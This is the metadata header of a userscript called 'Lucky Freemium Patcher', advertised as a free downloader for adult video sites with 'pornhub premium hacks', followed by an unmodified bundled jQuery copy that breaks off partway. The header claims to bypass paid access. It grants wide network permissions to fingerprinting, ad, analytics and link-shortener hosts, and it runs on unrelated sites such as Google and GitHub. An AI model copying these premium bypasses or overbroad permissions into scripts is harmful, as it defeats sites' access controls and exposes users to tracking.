// ==UserScript==
// @version   			202035007
// @name       		Limitless Freedom
// @name:ar			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:bg			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:cs			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:da			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:de			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:el			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:en			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:eo			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:es			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:fi			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:fr			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:fr-CA		Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:he			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:hu			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:id			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:it			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:ko			PornDownloader [Lucky Freemium Patcher]
// @name:nb			Porn Downloader [Lucky Freemium Patcher]
// @name:nl			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:pl			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:pt-BR		Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:ro			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:ru			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:sk			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:sr			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:sv			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:th			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:tr			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:uk			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:vi			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:zh-TW		Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:zh-CN		Download Assistant by lfj.io [Lucky Freemium Patcher]
// @name:ja			Download Assistant by lfj.io [Lucky Freemium Patcher]
// @description					This script allow you to download any viewable video's on most popular porn sites for free, because what you can see, you can save. It's also let you optimize the display of there's site by changing how's that site looks, remember your favorite options when you searching, remove distractions, any ads that your adblocker having missed, and many other features in future.
// @description:ar				يسمح لك هذا النص البرمجي بتنزيل أي فيديو قابل للعرض على المواقع الإباحية الأكثر شيوعًا مجانًا ، لأن ما يمكنك رؤيته يمكنك حفظه. كما يسمح لك أيضًا بتحسين عرض موقع الويب عن طريق تغيير كيفية ظهور هذا الموقع ، وتذكر خياراتك المفضلة عند البحث ، وإزالة الانحرافات ، وأي إعلانات قد فاتك حظر الإعلانات الخاص بك ، والعديد من الميزات الأخرى في المستقبل.
// @description:bg	 		  	 Този скрипт ви позволява да изтегляте безплатно всички видими видеоклипове на най-популярните порно сайтове, защото това, което можете да видите, можете да запазите. Също така ви позволява да оптимизирате показването на сайт там, като промените как изглежда този сайт, запомнете любимите си опции, когато търсите, премахнете отвличащи вниманието, всички реклами, които вашият adblocker е пропуснал и много други функции в бъдеще.
// @description:cs				Tento skript vám umožňuje zdarma stahovat všechna viditelná videa na nejpopulárnějších pornografických stránkách, protože to, co vidíte, můžete uložit. Umožní vám také optimalizovat zobrazení stránek změnou vzhledu tohoto webu, zapamatovat si své oblíbené možnosti při vyhledávání, odstranit rozptýlení, všechny reklamy, které váš blokovač reklam zmeškal, a mnoho dalších funkcí v budoucnosti.
// @description:da				Dette script giver dig mulighed for at downloade alle synlige videoer på de mest populære pornosider gratis, fordi hvad du kan se, du kan gemme. Det giver dig også mulighed for at optimere visningen af sit websted ved at ændre, hvordan det pågældende websted ser ud, huske dine yndlingsindstillinger, når du søger, fjerne distraktioner, alle annoncer, som din adblocker har savnet, og mange andre funktioner i fremtiden.
// @description:de				Mit diesem Skript können Sie alle sichtbaren Videos auf den beliebtesten Pornoseiten kostenlos herunterladen, denn was Sie sehen können, können Sie speichern. Sie können damit auch die Anzeige der Website optimieren, indem Sie das Erscheinungsbild dieser Website ändern, sich bei der Suche an Ihre bevorzugten Optionen erinnern, Ablenkungen entfernen, Anzeigen, die Ihr Adblocker verpasst hat, und viele andere Funktionen in Zukunft.
// @description:el				Αυτό το σενάριο σάς επιτρέπει να κάνετε λήψη οποιουδήποτε βίντεο με δυνατότητα προβολής στους πιο δημοφιλείς ιστότοπους πορνό δωρεάν. Σας επιτρέπει επίσης να βελτιστοποιήσετε την εμφάνιση του ιστότοπου, αλλάζοντας την εμφάνιση αυτού του ιστότοπου, να θυμάστε τις αγαπημένες σας επιλογές κατά την αναζήτηση, να αφαιρέσετε περισπασμούς, τυχόν διαφημίσεις που έχασε το πρόγραμμα αποκλεισμού διαφημίσεων και πολλές άλλες λειτουργίες στο μέλλον.
// @description:en				This script allow you to download any viewable video's on most popular porn sites for free, because what you can see, you can save. It's also let you optimize the display of there's site by changing how's that site looks, remember your favorite options when you searching, remove distractions, any ads that your adblocker having missed, and many other features in future.
// @description:eo				Ĉi tiu skripto permesas elŝuti ajnajn videblajn filmetojn sur la plej popularaj pornaj retejoj senpage, ĉar kion vi povas vidi, vi povas ŝpari. Ĝi ankaŭ lasas vin optimumigi la montradon de tiea retejo ŝanĝante, kiel aspektas tiu retejo, memoru viajn plej ŝatatajn eblojn kiam vi serĉas, forigas distrojn, iujn ajn reklamojn, kiujn mankis via reklamilo, kaj multajn aliajn funkciojn estonte.
// @description:es				Este script le permite descargar cualquier video visible en los sitios porno más populares de forma gratuita, porque lo que puede ver, puede guardarlo. También le permite optimizar la visualización de su sitio al cambiar el aspecto de ese sitio, recordar sus opciones favoritas cuando busca, eliminar distracciones, cualquier anuncio que su bloqueador de anuncios se haya perdido y muchas otras características en el futuro.
// @description:fi				Tämän komentosarjan avulla voit ladata ilmaiseksi katseltavia videoita suosituimmista pornosivustoista, koska mitä voit nähdä, voit tallentaa. Sen avulla voit myös optimoida sivuston näytön muuttamalla sivuston ulkoasua, muistamaan suosikkivaihtoehdot haettaessasi, poistamalla häiriötekijät, mainokset, jotka mainostajasi on unohtanut, ja monia muita ominaisuuksia tulevaisuudessa.
// @description:fr				Ce script vous permet de télécharger gratuitement toutes les vidéos visibles sur les sites porno les plus populaires. Il vous permet également d'optimiser l'affichage de votre site en modifiant l'apparence de ce site, de vous souvenir de vos options préférées lorsque vous effectuez une recherche, de supprimer les distractions, toutes les annonces que votre bloqueur de publicité a manquées et de nombreuses autres fonctionnalités à l'avenir.
// @description:fr-CA				Ce script vous permet de télécharger gratuitement toutes les vidéos visibles sur les sites porno les plus populaires. Il vous permet également d'optimiser l'affichage de votre site en modifiant l'apparence de ce site, de vous souvenir de vos options préférées lorsque vous effectuez une recherche, de supprimer les distractions, toutes les annonces que votre bloqueur de publicité a manquées et de nombreuses autres fonctionnalités à l'avenir.
// @description:he				סקריפט זה מאפשר לך להוריד כל סרטון הניתן לצפייה באתרי הפורנו הפופולריים ביותר בחינם, מכיוון שמה שאתה יכול לראות אתה יכול לשמור. זה גם מאפשר לך למטב את התצוגה של אתר זה על ידי שינוי האופן בו נראה האתר הזה, לזכור את האפשרויות המועדפות עליך כשאתה מבצע חיפוש, להסיר הסחות דעת, כל המודעות שבלבל המודעות שלך החמיץ, ותכונות רבות אחרות בעתיד.
// @description:hu				Ez a szkript lehetővé teszi, hogy ingyenesen letölthessen bármilyen megtekinthető videót a legnépszerűbb pornó oldalakról. Ezenkívül optimalizálhatja a webhely megjelenítését azáltal, hogy megváltoztatja a webhely megjelenését, emlékezzen a kedvenc lehetőségeire, amikor keres, távolítsa el a zavaró tényezőket, az összes olyan hirdetést, amelyről a hirdető blokkolása hiányzott, és a jövőben számos egyéb funkcióval is rendelkezik.
// @description:id				Skrip ini memungkinkan Anda untuk mengunduh video apa pun yang dapat dilihat di situs porno paling populer secara gratis, karena apa yang dapat Anda lihat, dapat Anda simpan. Anda juga dapat mengoptimalkan tampilan situs yang ada dengan mengubah penampilan situs itu, mengingat opsi favorit Anda saat mencari, menghilangkan gangguan, iklan apa pun yang dilewatkan oleh pencbler, dan banyak fitur lainnya di masa mendatang.
// @description:it				Questo script ti consente di scaricare gratuitamente qualsiasi video visualizzabile sui siti porno più popolari, perché ciò che puoi vedere è possibile salvare. Ti consente anche di ottimizzare la visualizzazione di un sito modificando l'aspetto di quel sito, ricordare le tue opzioni preferite durante la ricerca, rimuovere le distrazioni, eventuali annunci che il tuo adblocker ha perso e molte altre funzionalità in futuro.
// @description:ko				이 스크립트를 사용하면 가장 인기있는 포르노 사이트에서 볼 수있는 비디오를 무료로 다운로드 할 수 있습니다. 또한 사이트 표시 방식을 변경하고 검색 할 때 자주 사용하는 옵션을 기억하고주의를 분산 시키며 광고 차단기가 놓친 광고 및 기타 많은 기능을 통해 사이트 표시를 최적화 할 수 있습니다.
// @description:nb				Dette skriptet lar deg laste ned alle synlige videoer på de mest populære pornosidene gratis, fordi det du kan se kan du lagre. Det lar deg også optimalisere visningen av nettstedet ved å endre hvordan nettstedet ser ut, huske favorittalternativene dine når du søker, fjerne distraksjoner, annonser som annonseblokkeren din har gått glipp av og mange andre funksjoner i fremtiden.
// @description:nl				Met dit script kun je alle zichtbare video's op de meest populaire pornosites gratis downloaden, want wat je kunt zien, kun je opslaan. Het laat je ook de weergave van zijn site optimaliseren door te veranderen hoe die site eruit ziet, onthoud je favoriete opties wanneer je zoekt, verwijder afleidingen, alle advertenties die je adblocker heeft gemist en vele andere functies in de toekomst.
// @description:pl				Ten skrypt umożliwia bezpłatne pobieranie wszystkich widocznych filmów z najpopularniejszych stron porno, ponieważ to, co widzisz, możesz zapisać. Pozwala także zoptymalizować wyświetlanie witryny, zmieniając jej wygląd, zapamiętuj ulubione opcje podczas wyszukiwania, usuwaj rozproszenia, wszelkie reklamy, które przegapił Twój adblocker, i wiele innych funkcji w przyszłości.
// @description:pt-BR				Esse script permite que você baixe gratuitamente qualquer vídeo visível nos sites pornográficos mais populares, porque o que você pode ver pode salvar. Ele também permite otimizar a exibição do site, alterando a aparência desse site, lembre-se de suas opções favoritas ao pesquisar, remova distrações, quaisquer anúncios perdidos pelo bloqueador de anúncios e muitos outros recursos no futuro.
// @description:ro				Acest script vă permite să descărcați gratuit orice videoclip vizibil pe cele mai populare site-uri porno, deoarece ceea ce puteți vedea, puteți salva. De asemenea, vă permite să optimizați afișarea site-ului acolo schimbând aspectul acelui site, să vă amintiți opțiunile preferate atunci când căutați, să eliminați distrageri, orice anunțuri pe care adblockerul le-a pierdut și multe alte funcții în viitor.
// @description:ru				Этот скрипт позволит вам загружать любые видимых видео на самых популярных порно сайтов бесплатно, потому что вы можете видеть, вы можете сэкономить. Это также позволяет оптимизировать отображение своего сайта, изменяя внешний вид этого сайта, запоминать любимые параметры при поиске, устранять отвлекающие факторы, любую рекламу, пропущенную вашим рекламным блокировщиком, и многие другие функции в будущем.
// @description:sk				Ta skript vam omogoča brezplačno prenašanje poljubnih vidnih videoposnetkov na najbolj priljubljenih pornografskih spletnih mestih, kajti tisto, kar lahko vidite, lahko shranite. Omogoča vam tudi optimizacijo prikaza spletnega mesta s spreminjanjem videza tega spletnega mesta, zapomnite si svoje priljubljene možnosti pri iskanju, odstranjevanje motenj, vse oglase, ki jih je vaš adblocker zamudil in številne druge funkcije v prihodnosti.
// @description:sr				Ова скрипта вам омогућава да бесплатно преузмете било који видљиви видео запис на најпопуларнијим порно сајтовима, јер оно што видите можете да сачувате. Омогућава вам и оптимизацију приказа сајта тамо променом изгледа те странице, памћење омиљених опција приликом претраживања, уклањање дистракција, било које огласе које је ваш адблоцкер пропустио и многе друге функције у будућности.
// @description:sv				Detta skript låter dig ladda ner alla synliga videor på de mest populära porrsidorna gratis, eftersom det du kan se kan du spara. Det låter dig också optimera visningen av webbplatsen genom att ändra hur webbplatsen ser ut, komma ihåg dina favoritalternativ när du söker, ta bort distraktioner, alla annonser som din annonsblockerare har missat och många andra funktioner i framtiden.
// @description:th				สคริปต์นี้อนุญาตให้คุณดาวน์โหลดวิดีโอใด ๆ ที่สามารถดูได้บนเว็บไซต์ลามกยอดนิยมฟรีเพราะคุณสามารถดูได้คุณสามารถบันทึกได้ นอกจากนี้ยังช่วยให้คุณปรับการแสดงผลของเว็บไซต์โดยปรับเปลี่ยนรูปลักษณ์ของเว็บไซต์จำตัวเลือกที่คุณโปรดปรานเมื่อคุณค้นหาลบสิ่งรบกวนโฆษณาใด ๆ ที่ adblocker พลาดและคุณสมบัติอื่น ๆ ในอนาคต
// @description:tr				Bu komut dosyası, en popüler porno sitelerinde görüntülenebilir herhangi bir videoyu ücretsiz indirmenize izin verir, çünkü görebildiğiniz şey kaydedebilirsiniz. Ayrıca, sitenin görünümünü değiştirerek, arama yaparken favori seçeneklerinizi hatırlayın, dikkat dağıtıcıları kaldırın, reklam engelleyicinizin kaçırdığı reklamları ve gelecekte birçok özelliği kullanarak sitenin görüntüsünü optimize etmenizi sağlar.
// @description:uk				Цей сценарій дозволяє безкоштовно завантажувати будь-які видимі відео на найпопулярніших порносайтах, оскільки те, що ви можете побачити, ви можете зберегти. Це також дозволяє оптимізувати показ сайту, змінюючи, як виглядає цей сайт, запам’ятовувати улюблені параметри під час пошуку, видаляти відволікання, будь-які оголошення, пропущені рекламодавцем, та багато інших функцій у майбутньому.
// @description:vi				Cho phép bạn tải xuống bất kỳ video có thể xem nào trên hầu hết các trang web khiêu dâm phổ biến, những gì bạn có thể thấy, bạn có thể tải. Nó cũng cho phép bạn tối ưu hóa hiển thị trang web bằng cách thay đổi giao diện của trang đó, ghi nhớ các tùy chọn yêu thích của bạn khi bạn tìm kiếm, xóa bỏ phiền nhiễu, bất kỳ quảng cáo nào mà trình chặn quảng cáo của bạn chưa chặn được và nhiều tính năng khác trong tương lai.
// @description:zh-TW				使用此腳本，您可以免費下載最流行的色情網站上的任何可見視頻，因為您可以看到，可以保存。 它還可以讓您通過更改網站的外觀，在搜索時記住您喜歡的選項，消除乾擾，您的adblocker錯過的任何廣告以及將來的許多其他功能來優化該網站的顯示。
// @description:zh-CN				使用此脚本，您可以免费下载最流行的色情网站上的任何可见视频，因为您可以看到，可以保存。 它还可以让您通过更改网站的外观，在搜索时记住您喜欢的选项，消除干扰，您的广告拦截器错过的任何广告以及将来的许多其他功能来优化该网站的显示。
// @description:ja				このスクリプトを使用すると、最も人気のあるポルノサイトにある視聴可能なビデオを無料でダウンロードできます。 また、サイトの外観を変更することでサイトの表示を最適化し、検索時にお気に入りのオプションを覚え、気を散らすもの、広告ブロッカーが見逃した広告、その他の多くの機能を将来的に削除できます。
// @namespace   lfj.io
// @author      lfj.io
// @copyright   lfj.io
// @compatible        chrome Chrome_70.0.2490.86 + Violentmonkey
// @compatible        firefox Firefox_69.0 + Violentmonkey
// @compatible        opera Opera_55.0.1990.115 + Violentmonkey
// @compatible        safari 7.0.3 + Violentmonkey
// @compatible        macintosh 10_9_3 + Violentmonkey
// @license GPL-3.0-or-later; http://www.gnu.org/licenses/gpl-3.0.txt
// @homepage    https://lfj.io/
// @icon		http://lfj.io/template/images/logo.svg
// @supportURL  https://lfj.io/
// @setupURL    https://lfj.io/lfj.user.js
// @connect     analdin.com
// @connect     xozilla.com
// @connect     porntrex.com
// @connect     thisav.com
// @connect     tube8.com
// @connect     xtube.com
// @connect     hoakhuya.com
// @connect     lfj.io
// @connect     pornhubpremium.com
// @connect     pornhub.com
// @connect     pornhub.es
// @connect     phncdn.com
// @connect     t8cdn.com
// @connect     xvideos.com
// @connect     xhamster.com
// @connect     4horlover.com
// @connect     xnxx.com
// @connect     xhamster.one
// @connect     gounlimited.to
// @connect     dood.to
// @connect     allanalpass.com
// @connect     poontown.net
// @connect     xhamster.desi
// @connect     xvideos.red
// @connect     universal-bypass.org
// @connect     pornhub.xxx
// @connect     pornhub.net
// @connect     modelhub.com
// @connect     xvideos.xxx
// @connect     xvideos.net
// @connect     xvideos-cdn.com
// @connect     xvideos.es
// @connect     xnxx.es
// @connect     ahcdn.com
// @connect     phprcdn.com
// @connect		  xhamster1.desi
// @connect		  xhamster2.com
// @connect		  github.io
// @connect		  xhamster7.com
// @connect		  histats.com
// @connect		  adf.ly
// @connect		  j.gs
// @connect		  xhamster8.com
// @connect		  xhamster9.com
// @connect		  xhamster10.com
// @connect		  xhamster11.com
// @connect		  xhamster12.com
// @connect		  xhamster13.com
// @connect		  xhamster14.com
// @connect		  xhamster15.com
// @connect		  xhamster17.com
// @connect		  xhamster18.com
// @connect		  nhh57.com
// @connect		  aet38.com
// @connect		  taraa.xyz
// @connect		  adult.xyz
// @connect		  youtube.com
// @connect		  weibo.com
// @connect		  weibo.cn
// @connect		  rrq53.com
// @connect		  mixdrop.co
// @connect		  xhamster19.com
// @connect		  xhamster20.com
// @connect		  ouo.io
// @connect		  xnxx-cdn.com
// @connect		  facebook.com
// @connect		  ouo.press
// @connect		  cluster.awmserve.com
// @connect		  github.com
// @connect		  githubusercontent.com
// @connect		  googleapis.com
// @connect		  jsdelivr.net
// @connect		  googletagmanager.com
// @connect		  google-analytics.com
// @connect		  www.google-analytics.com
// @connect		  www.google.com
// @connect		  fingerprintjs.com
// @connect		  doubleclick.net
// @connect		  stats.g.doubleclick.net
// @connect		  megaupload.is
// @connect		  1fichier.com
// @connect		  solidfiles.com
// @connect		  megaupload.com
// @connect		  anonfile.com
// @connect		  bayfiles.com
// @connect		  free.fr
// @connect		  datafilehost.com
// @include     *://*.datafilehost.com/*
// @include     *://datafilehost.com/*
// @include     *://anondrive.com/*
// @include     *://forumfiles.com/*
// @include     *://fileleaks.com/*
// @include     *://anondrive.com/*
// @include     *://*.xvideos.red/*
// @include     *://*.youtube.com/*
// @include     *://uplovd.com/*
// @include     *://*.free.fr/*
// @include     *://gounlimited.to/*
// @include     *://dood.to/*
// @include     *://mixdrop.co/*
// @include     *://*.onion/*
// @include     *://bayfiles.com/*
// @include     *://anonfile.com/*
// @include     *://anonfiles.com/*
// @include     *://github.io/*
// @include     *://*.megaupload.com/*
// @include     *://*.solidfiles.com/*
// @include     *://1fichier.com/*
// @include     *://*.1fichier.com/*
// @include     *://*.megaupload.is/*
// @include     *://theporndude.com/*
// @include     *://*.google*.com/*
// @include     *://*.google*.com/*
// @include     *://greasyfork.org/*
// @include     *://sleazyfork.org/*
// @include     *://openuserjs.org/*
// @include     *://*.analdin.com/*
// @include     *://*.xozilla.com/*
// @include     *://*.porntrex.com/*
// @include     *://*.thisav.com/*
// @include     *://*.lfj.io/*
// @include     *://lfj.io/*
// @include     *://*.tube8.com/*
// @include     *://*.xtube.com/*
// @include     *://*.pornhub.com/*
// @include     *://*.pornhubpremium.com/*
// @include     *://de.pornhubpremium.com/*
// @include     *://fr.pornhubpremium.com/*
// @include     *://*.hoakhuya.com/*
// @include     *://es.pornhubpremium.com/*
// @include     *://it.pornhubpremium.com/*
// @include     *://pt.pornhubpremium.com/*
// @include     *://pl.pornhubpremium.com/*
// @include     *://rt.pornhubpremium.com/*
// @include     *://jp.pornhubpremium.com/*
// @include     *://nl.pornhubpremium.com/*
// @include     *://cz.pornhubpremium.com/*
// @include     *://cn.pornhubpremium.com/*
// @include     *://de.pornhub.com/*
// @include     *://*.phncdn.com/*
// @include     *://*.t8cdn.com/*
// @include     *://fr.pornhub.com/*
// @include     *://es.pornhub.com/*
// @include     *://it.pornhub.com/*
// @include     *://pt.pornhub.com/*
// @include     *://pl.pornhub.com/*
// @include     *://rt.pornhub.com/*
// @include     *://jp.pornhub.com/*
// @include     *://nl.pornhub.com/*
// @include     *://cz.pornhub.com/*
// @include     *://*.modelhub.com/*
// @include     *://cn.pornhub.com/*
// @include     *://*.xvideos.com/*
// @include		  *://xhamster.com/*
// @include     *://4horlover.com/*
// @include     *://*.pornhub.es/*
// @include     *://*.xnxx.com/*
// @include		  *://xhamster.one/*
// @include		  *://xhamster.desi/*
// @include     *://*.pornhub.xxx/*
// @include     *://*.pornhub.net/*
// @include     *://*.poontown.net/*
// @include     *://rrq53.com/*
// @include     *://*.rrq53.com/*
// @include     *://aet38.com/*
// @include     *://*.aet38.com/*
// @include     *://*.nhh57.com/*
// @include     *://*.xvideos.xxx/*
// @include     *://*.xvideos.net/*
// @include     *://*.xvideos-cdn.com/*
// @include     *://*.xvideos.es/*
// @include     *://*.xnxx.es/*
// @include     *://*.ahcdn.com/*
// @include     *://*.phprcdn.com/*
// @include		  *://xhamster1.desi/*
// @include		  *://xhamster2.com/*
// @include		  *://xhamster7.com/*
// @include		  *://xhamster8.com/*
// @include		  *://xhamster9.com/*
// @include		  *://xhamster10.com/*
// @include		  *://xhamster11.com/*
// @include		  *://xhamster12.com/*
// @include		  *://xhamster13.com/*
// @include		  *://xhamster14.com/*
// @include		  *://xhamster15.com/*
// @include		  *://xhamster17.com/*
// @include		  *://xhamster18.com/*
// @include		  *://xhamster19.com/*
// @include		  *://xhamster20.com/*
// @include		  *://xhamster20.com/*
// @include		  *://ouo.io/*
// @include		  *://*.xnxx-cdn.com/*
// @include		  *://ouo.press/*
// @include		  *://cluster.awmserve.com/*
// @include		  *://thewolds.github.io/*
// @include		  *://mewatch.github.io/*
// @include		  *://github.com/thewolds/*
// @include		  *://github.com/mewatch/*
// @grant         GM_setClipboard
// @grant         unsafeWindow
// @grant         window.close
// @grant         window.open
// @grant         window.focus
// @grant         GM_xmlhttpRequest
// @grant         GM_getResourceText
// @grant         GM_getResourceURL
// @grant         GM_addStyle
// @grant         GM_download
// @grant         GM_registerMenuCommand
// @grant         GM_unregisterMenuCommand
// @grant         GM_openInTab
// @grant         GM_notification
// @grant         GM_setValue
// @grant         GM_getValue
// @grant         GM_deleteValue
// @noframes
// @noframe
// @change-log  Improved pornhub
// @run-at      document-body
// ==/UserScript==
/* String Prototype */
//UDT#!<li style="text-transform: none !important;margin-bottom: 10px;">Hotfix for pornhub premium hacks </li>
//DUR#!https://lfj.io/lfj.user.js
  ( function( global, factory ) {

      "use strict";

      if ( typeof module === "object" && typeof module.exports === "object" ) {

          // For CommonJS and CommonJS-like environments where a proper `window`
          // is present, execute the factory and get jQuery.
          // For environments that do not have a `window` with a `document`
          // (such as Node.js), expose a factory as module.exports.
          // This accentuates the need for the creation of a real `window`.
          // e.g. var jQuery = require("jquery")(window);
          // See ticket #14549 for more info.
          module.exports = global.document ?
              factory( global, true ) :
              function( w ) {
                  if ( !w.document ) {
                      throw new Error( "jQuery requires a window with a document" );
                  }
                  return factory( w );
              };
      } else {
          factory( global );
      }

  // Pass this if window is not defined yet
  } )( typeof window !== "undefined" ? window : this, function( window, noGlobal ) {

  // Edge <= 12 - 13+, Firefox <=18 - 45+, IE 10 - 11, Safari 5.1 - 9+, iOS 6 - 9.1
  // throw exceptions when non-strict code (e.g., ASP.NET 4.5) accesses strict mode
  // arguments.callee.caller (trac-13335). But as of jQuery 3.0 (2016), strict mode should be common
  // enough that all such attempts are guarded in a try block.
  "use strict";

  var arr = [];

  var document = window.document;

  var getProto = Object.getPrototypeOf;

  var slice = arr.slice;

  var concat = arr.concat;

  var push = arr.push;

  var indexOf = arr.indexOf;

  var class2type = {};

  var toString = class2type.toString;

  var hasOwn = class2type.hasOwnProperty;

  var fnToString = hasOwn.toString;

  var ObjectFunctionString = fnToString.call( Object );

  var support = {};



      function DOMEval( code, doc ) {
          doc = doc || document;

          var script = doc.createElement( "script" );

          script.text = code;
          doc.head.appendChild( script ).parentNode.removeChild( script );
      }
  /* global Symbol */
  // Defining this global in .eslintrc.json would create a danger of using the global
  // unguarded in another place, it seems safer to define global only for this module



  var
      version = "3.2.1",

      // Define a local copy of jQuery
      jQuery = function( selector, context ) {

          // The jQuery object is actually just the init constructor 'enhanced'
          // Need init if jQuery is called (just allow error to be thrown if not included)
          return new jQuery.fn.init( selector, context );
      },

      // Support: Android <=4.0 only
      // Make sure we trim BOM and NBSP
      rtrim = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,

      // Matches dashed string for camelizing
      rmsPrefix = /^-ms-/,
      rdashAlpha = /-([a-z])/g,

      // Used by jQuery.camelCase as callback to replace()
      fcamelCase = function( all, letter ) {
          return letter.toUpperCase();
      };

  jQuery.fn = jQuery.prototype = {

      // The current version of jQuery being used
      jquery: version,

      constructor: jQuery,

      // The default length of a jQuery object is 0
      length: 0,

      toArray: function() {
          return slice.call( this );
      },

      // Get the Nth element in the matched element set OR
      // Get the whole matched element set as a clean array
      get: function( num ) {

          // Return all the elements in a clean array
          if ( num == null ) {
              return slice.call( this );
          }

          // Return just the one element from the set
          return num < 0 ? this[ num + this.length ] : this[ num ];
      },

      // Take an array of elements and push it onto the stack
      // (returning the new matched element set)
      pushStack: function( elems ) {

          // Build a new jQuery matched element set
          var ret = jQuery.merge( this.constructor(), elems );

          // Add the old object onto the stack (as a reference)
          ret.prevObject = this;

          // Return the newly-formed element set
          return ret;
      },

      // Execute a callback for every element in the matched set.
      each: function( callback ) {
          return jQuery.each( this, callback );
      },

      map: function( callback ) {
          return this.pushStack( jQuery.map( this, function( elem, i ) {
              return callback.call( elem, i, elem );
          } ) );
      },

      slice: function() {
          return this.pushStack( slice.apply( this, arguments ) );
      },

      first: function() {
          return this.eq( 0 );
      },

      last: function() {
          return this.eq( -1 );
      },

      eq: function( i ) {
          var len = this.length,
              j = +i + ( i < 0 ? len : 0 );
          return this.pushStack( j >= 0 && j < len ? [ this[ j ] ] : [] );
      },

      end: function() {
          return this.prevObject || this.constructor();
      },

      // For internal use only.
      // Behaves like an Array's method, not like a jQuery method.
      push: push,
      sort: arr.sort,
      splice: arr.splice
  };

  jQuery.extend = jQuery.fn.extend = function() {
      var options, name, src, copy, copyIsArray, clone,
          target = arguments[ 0 ] || {},
          i = 1,
          length = arguments.length,
          deep = false;

      // Handle a deep copy situation
      if ( typeof target === "boolean" ) {
          deep = target;

          // Skip the boolean and the target
          target = arguments[ i ] || {};
          i++;
      }

      // Handle case when target is a string or something (possible in deep copy)
      if ( typeof target !== "object" && !jQuery.isFunction( target ) ) {
          target = {};
      }

      // Extend jQuery itself if only one argument is passed
      if ( i === length ) {
          target = this;
          i--;
      }

      for ( ; i < length; i++ ) {

          // Only deal with non-null/undefined values
          if ( ( options = arguments[ i ] ) != null ) {

              // Extend the base object
              for ( name in options ) {
                  src = target[ name ];
                  copy = options[ name ];

                  // Prevent never-ending loop
                  if ( target === copy ) {
                      continue;
                  }

                  // Recurse if we're merging plain objects or arrays
                  if ( deep && copy && ( jQuery.isPlainObject( copy ) ||
                      ( copyIsArray = Array.isArray( copy ) ) ) ) {

                      if ( copyIsArray ) {
                          copyIsArray = false;
                          clone = src && Array.isArray( src ) ? src : [];

                      } else {
                          clone = src && jQuery.isPlainObject( src ) ? src : {};
                      }

                      // Never move original objects, clone them
                      target[ name ] = jQuery.extend( deep, clone, copy );

                  // Don't bring in undefined values
                  } else if ( copy !== undefined ) {
                      target[ name ] = copy;
                  }
              }
          }
      }

      // Return the modified object
      return target;
  };

  jQuery.extend( {

      // Unique for each copy of jQuery on the page
      expando: "jQuery" + ( version + Math.random() ).replace( /\D/g, "" ),

      // Assume jQuery is ready without the ready module
      isReady: true,

      error: function( msg ) {
          throw new Error( msg );
      },

      noop: function() {},

      isFunction: function( obj ) {
          return jQuery.type( obj ) === "function";
      },

      isWindow: function( obj ) {
          return obj != null && obj === obj.window;
      },

      isNumeric: function( obj ) {

          // As of jQuery 3.0, isNumeric is limited to
          // strings and numbers (primitives or objects)
          // that can be coerced to finite numbers (gh-2662)
          var type = jQuery.type( obj );
          return ( type === "number" || type === "string" ) &&

              // parseFloat NaNs numeric-cast false positives ("")
              // ...but misinterprets leading-number strings, particularly hex literals ("0x...")
              // subtraction forces infinities to NaN
              !isNaN( obj - parseFloat( obj ) );
      },

      isPlainObject: function( obj ) {
          var proto, Ctor;

          // Detect obvious negatives
          // Use toString instead of jQuery.type to catch host objects
          if ( !obj || toString.call( obj ) !== "[object Object]" ) {
              return false;
          }

          proto = getProto( obj );

          // Objects with no prototype (e.g., `Object.create( null )`) are plain
          if ( !proto ) {
              return true;
          }

          // Objects with prototype are plain iff they were constructed by a global Object function
          Ctor = hasOwn.call( proto, "constructor" ) && proto.constructor;
          return typeof Ctor === "function" && fnToString.call( Ctor ) === ObjectFunctionString;
      },

      isEmptyObject: function( obj ) {

          /* eslint-disable no-unused-vars */
          // See https://github.com/eslint/eslint/issues/6125
          var name;

          for ( name in obj ) {
              return false;
          }
          return true;
      },

      type: function( obj ) {
          if ( obj == null ) {
              return obj + "";
          }

          // Support: Android <=2.3 only (functionish RegExp)
          return typeof obj === "object" || typeof obj === "function" ?
              class2type[ toString.call( obj ) ] || "object" :
              typeof obj;
      },

      // Evaluates a script in a global context
      globalEval: function( code ) {
          DOMEval( code );
      },

      // Convert dashed to camelCase; used by the css and data modules
      // Support: IE <=9 - 11, Edge 12 - 13
      // Microsoft forgot to hump their vendor prefix (#9572)
      camelCase: function( string ) {
          return string.replace( rmsPrefix, "ms-" ).replace( rdashAlpha, fcamelCase );
      },

      each: function( obj, callback ) {
          var length, i = 0;

          if ( isArrayLike( obj ) ) {
              length = obj.length;
              for ( ; i < length; i++ ) {
                  if ( callback.call( obj[ i ], i, obj[ i ] ) === false ) {
                      break;
                  }
              }
          } else {
              for ( i in obj ) {
                  if ( callback.call( obj[ i ], i, obj[ i ] ) === false ) {
                      break;
                  }
              }
          }

          return obj;
      },

      // Support: Android <=4.0 only
      trim: function( text ) {
          return text == null ?
              "" :
              ( text + "" ).replace( rtrim, "" );
      },

      // results is for internal usage only
      makeArray: function( arr, results ) {
          var ret = results || [];

